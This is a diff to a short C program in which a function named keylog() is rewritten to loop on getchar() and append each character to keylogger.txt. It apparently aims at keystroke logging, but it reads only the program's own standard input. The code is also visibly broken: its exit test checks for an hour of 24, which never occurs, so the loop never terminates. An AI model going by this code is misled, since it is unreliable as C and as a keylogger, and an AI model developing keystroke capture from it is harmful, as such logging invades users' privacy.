@@ -2,23 +2,39 @@
 #include <stdlib.h>
 #include <time.h>
 
-int keylog()
+void keylog()
 {
-    FILE * fPtr;
-    fPtr = fopen("keylogger.txt", "w+");
+    FILE *fPtr;
+    char c;
 
-    fopen("keylogger.txt", "w");
-    const char *a = getchar();
+    fPtr = fopen("keylogger.txt", "a");
     
-    if(a != NULL)
-        fprintf(fPtr, a);
-    
-    time_t now = time(NULL);
-    struct tm *tm_struct = localtime(&now);
-    int hour = tm_struct->tm_hour;
-    
-    if(hour == 24)
-        fclose(fPtr);
+    // Check if created successfully
+    if (fPtr == NULL)
+    {
+        printf("Unable to create file.\n");
+        exit(EXIT_FAILURE);
+    }   
+
+    struct tm *tm_struct;
+    int hour;
+
+    while(1)
+    {
+        c = getchar();
+
+        if(c != EOF)
+            fprintf(fPtr, "%c", c);
+        
+        time_t now = time(NULL);
+        tm_struct = localtime(&now);
+        hour = tm_struct->tm_hour;
+
+        if(hour == 24)
+            break;
+    }
+
+    fclose(fPtr);   
 }
 
 int main()
